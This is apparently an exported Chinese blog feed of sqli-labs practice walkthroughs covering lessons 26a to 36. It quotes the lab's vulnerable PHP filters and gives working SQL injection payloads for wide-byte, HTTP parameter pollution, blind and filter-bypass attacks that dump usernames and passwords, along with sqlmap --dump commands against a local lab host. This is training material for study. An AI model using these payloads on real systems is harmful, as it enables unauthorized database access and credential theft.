title="post型宽字节注入"></a>post型宽字节注入</h1><p><a name="oaebC"></a></p><h2 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>**uname=汉'** union select 1,database()--+</code> <a name="ABEKW"></a></p><h2 id="爆破数据库表名称"><a href="#爆破数据库表名称" class="headerlink" title="爆破数据库表名称"></a>爆破数据库表名称</h2><p><code>**uname=汉'** union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code> <a name="ihxEF"></a></p><h2 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p>爆破字段的时候<strong>需要将数据表的名字</strong>进行十六进制编码，防止转义 &amp;#x20;<br>users的16进制是0x7573657273</p><p><code>**uname=汉'** union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code> <a name="K0Bi6"></a></p><h2 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h2><p><code>**uname=汉'** union select 1,(select group_concat(username,0x7e,password) from users)--+</code></p><p><a name="eRAU0"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><blockquote><p><strong>–tamper=”unmagicquotes.py”宽字节注入</strong></p></blockquote><p><a name="Eou5c"></a></p><h2 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"</code> <a name="FwuSB"></a></p><h2 id="爆破数据库名称-1"><a href="#爆破数据库名称-1" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"  --current-db</code> <a name="cWP4j"></a></p><h2 id="爆破数据表名称"><a href="#爆破数据表名称" class="headerlink" title="爆破数据表名称"></a>爆破数据表名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py"  -D "security" --tables</code> <a name="HBofh"></a></p><h2 id="爆破字段名称-1"><a href="#爆破字段名称-1" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --columns</code> <a name="YOLQ5"></a></p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p><code>sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&amp;uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --dump</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less36</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less36/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_quotes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span><span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤。<br><strong>mysql_real_escape_string()函数</strong>转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><ul><li><strong>\x00</strong></li><li><strong>\n</strong></li><li><strong>\r</strong></li><li><hr></li><li><strong>‘</strong></li><li><strong>“</strong></li><li><strong>\x1a</strong></li></ul><p>通过页面回显发现依旧是<strong>宽字节注入</strong>\ <a name="JU3F6"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?id=1'</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1’<br>The Query String you input in Hex becomes : 315c27<br>十六进制</p></blockquote><p>单引号被转义，利用**%df**突破</p><p><a name="jqyPJ"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>?id=1%df' order by 4--+  </code> <a name="B0iQ5"></a></p><h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>?id=-1%df' union select 1,2,3--+</code> <a name="kzUVz"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本 ,<br><code>?id=1 %df' and 1=2 union select 1,user(),version()--+</code>\ <a name="kzVJM"></a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称?id<span class="token operator">=</span>-1%df<span class="token string">' union select 1,2,database()--+爆破数据库表名称?id=-1%df'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称users的16进制是0x7573657273?id<span class="token operator">=</span>-1%df<span class="token string">' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+爆破字段内容?id=-1%df'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less33</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/less33/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span><span class="token operator">=</span> addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Less33通关方式与Less32一模一样<br>区别在于后台在Less33使用了**addslashes()**这个函数对字符串进行转义，<br>Less32手动添加过滤转义 <a name="EkWN2"></a></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">检查注入点<span class="token number">1</span><span class="token string">'单引号被转义了。?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>--+判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=1 order by 4--+ ?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+ 正常回显，有3列找回显点?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=2 union select 1,2,3--+  显示2，3是回显点爆破数据库名称?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span><span class="token number">1</span>%df<span class="token string">' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称users的16进制是0x7573657273?id=1%df'</span> and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span>0x7573657273--+爆破字段内容?id<span class="token operator">=</span><span class="token number">1</span>%df' and <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">2</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less31</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less31/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less31/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id= (<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与Less29的区别为闭合方式为**双引号加括号”)  **</p><p><code>?id=1&amp;id=0"</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-31\index.php</strong> on line <strong>33</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“0””) LIMIT 0,1’ at line 1</p></blockquote><p>使用括号加单引号闭合”)</p><p><code>?id=1&amp;id=0") union select 1,2,3--+</code><br>显示2，3是回显点</p><p><a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0”)</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&amp;id=0") union select 1,2,(select database()) --+查看数据表名称?id=1'</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">") union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+爆破字段名称?id=1&amp;id=0"</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span>"<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less30</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less30/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/less30/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less29的区别为闭合方式为双引号”</p><blockquote><p>This Site Protected by Worlds Best WAF<br>本网站受世界最佳WAF保护</p></blockquote><p><code>?id=1&amp;id=1" and 1="1</code>闭合<br>双引号闭合</p><p><a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0”</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&amp;id=0" union select 1,2,(select database()) --+查看数据表名称?id=1'</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">" union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+爆破字段名称?id=1&amp;id=0"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span>" union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less28a</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/less28a/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/less28a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span>//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //strip out /*//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out --.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out <span class="token comment">#.</span>//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out spaces.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过源码发现<strong>仅仅匹配了union select组合</strong>，<br>其余都未匹配，与Less28一样，用盲注的方式 ，**’)闭合**</p><p><code>1'</code><br><code>1') and 1=('1</code>闭合成功 <a name="U8oth"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断库长<span class="token number">1</span><span class="token string">')and length(database())=8--+返回正常,数据库长度为8逐一字符判断数据库名称1'</span><span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token punctuation">)</span>--+返回正常,s<span class="token punctuation">..</span>.判断数据表长度<span class="token number">1</span><span class="token string">')and length((select group_concat(table_name) from  information_schema.tables where table_schema=database() ))=29--+正常回显数据表串起来长为29...逐一字符判断数据表名称1'</span><span class="token punctuation">)</span> and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">101</span>--+正常回显,e<span class="token punctuation">..</span>.判断列长<span class="token number">1</span><span class="token string">')and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20--+正常回显,列长串起来是为20...逐一字符判断字段名称1'</span><span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+正常回显,i<span class="token punctuation">..</span>.逐一字符判断字段内容<span class="token number">1</span>'<span class="token punctuation">)</span>and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+显示正常,D<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less27a</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/less27a/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less27/less27a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out <span class="token keyword">select</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/UNION/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out UNION<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/SELECT/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out SELECT<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Union/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out Union<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/Select/s'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   //Strip out Select<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现闭合方式为<strong>双引号</strong>，其余与Less27相同</p><p><code>1"</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-27a\index.php</strong> on line <strong>37</strong></p></blockquote><p>双引号闭合</p><p><a name="nAsN4"></a></p><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><blockquote><p>uniOn<br>selEct<br>%0a：空格<br>00截断：%00</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名称<span class="token number">0</span><span class="token string">"%0a uniOn %0a selEct %0a 1,2,database();%00爆破数据表名称0"</span>%0a uniOn %0a selEct %0a <span class="token number">1,2</span>,<span class="token punctuation">(</span>selEct %0a group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> %0a from %0a information_schema.tables %0a where %0a <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>%00 爆破字段名<span class="token number">0</span><span class="token string">"%0a uniOn %0a selEct %0a 1,2,(selEct%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=database()%0aand%0atable_name='users');%00爆破字段内容0"</span>%0a uniOn %0a selEct %0a <span class="token number">1,2</span>,<span class="token punctuation">(</span>selEct<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">))</span>from%0ausers<span class="token punctuation">)</span><span class="token punctuation">;</span>%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less26a</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/less26a/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/less26/less26a/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //strip out OR <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/and/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //Strip out AND <span class="token punctuation">(</span>non <span class="token keyword">case</span> sensitive<span class="token punctuation">)</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token 